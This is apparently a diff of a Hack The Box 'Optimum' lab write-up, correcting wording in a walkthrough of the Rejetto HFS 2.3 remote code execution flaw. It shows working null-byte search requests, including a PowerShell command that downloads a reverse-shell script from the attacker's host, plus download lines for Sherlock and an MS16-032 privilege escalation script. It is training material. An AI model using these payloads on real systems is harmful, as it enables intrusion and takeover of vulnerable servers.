@@ -28,7 +28,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 On the web page we see an application called **HttpFileServer 2.3**.
 
-![HttpFileServer](https://kyuu-ji.github.io/htb-write-up/october/october_hfs.png)
+![HttpFileServer](https://kyuu-ji.github.io/htb-write-up/optimum/optimum-hfs.png)
 
 Looking for exploits for this service we find **Rejetto HTTP File Server 2.3.x - Remote Code Execution** with the CVE number [CVE-2014-6287](https://nvd.nist.gov/vuln/detail/CVE-2014-6287).
 
@@ -39,10 +39,10 @@ Instead of using the Metasploit Module, I will exploit this vulnerability manual
 
 ### Explaining and using the exploit
 
-The HFS application has an internal scripting language that uses some characters like curly brackets, pipe symbols and dots. They have a regular expression that searches and replaces these characters in the Search parameter.
+The HFS application has an internal scripting language that uses some characters like curly brackets, pipe symbols and dots. It has a regular expression that searches and replaces these characters in the Search parameter.
 When we send a _NULL Byte_ in the Search query, this will terminate the regular expression but everything after the NULL Byte will not be replaced.
 
-Before we can do this, we need to know which characters to send. We can find that out by reading the [Rejetto wiki](https://rejetto.com/wiki/index.php?title=HFS:_scripting_commands). The parameter **exec** is what we need to send execute executables.
+Before we can do this, we need to know which characters to send. We can find that out by reading the [Rejetto wiki](https://rejetto.com/wiki/index.php?title=HFS:_scripting_commands). The parameter **exec** is what we need to send to execute commands.
 ```markdown
 Example: {.exec|notepad.}
 ```
@@ -53,9 +53,9 @@ For testing we can send a simple `ping` command to verify that it works the way 
 GET /?search=%00{.exec|ping 10.10.14.23.} HTTP/1.1
 ```
 
-The `tcpdump` on my local machine waits for connections and after sending this request is outputs the ICMP packets. We have command execution and can start a reverse shell on this box.
+The `tcpdump` on my local machine waits for connections and after sending this request it outputs the ICMP packets. We have command execution and can start a reverse shell on this box.
 
-For this task I will use the Powershell script **Invoke-PowerShellTcp.ps1** from the **Nishang Framework** that will start a listener on my IP and port 9001.
+For this task I will use the Powershell script **Invoke-PowerShellTcp.ps1** from the **Nishang Framework** that will listen on my IP and port 9001.
 ```markdown
 GET /?search=%00{.exec|C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.23:8000/Invoke-PowerShellTcp.ps1').} HTTP/1.1
 
@@ -72,7 +72,7 @@ We search for vulnerabilities by using **Sherlock.ps1** with the _Find-AllVulns 
 IEX(New-Object Net.WebClient).downloadString('http://10.10.14.23:8000/Sherlock.ps1')
 ```
 
-It appears to be vulnerable against **MS016-032 - Secondary Logon Handle** which we will with the script _Invoke-MS16032.ps1_.
+It appears to be vulnerable against **MS016-032 - Secondary Logon Handle** which we will exploit with the script _Invoke-MS16032.ps1_.
 ```markdown
 IEX(New-Object Net.WebClient).downloadString('http://10.10.14.23:8000/Invoke-MS16032.ps1')
 ```
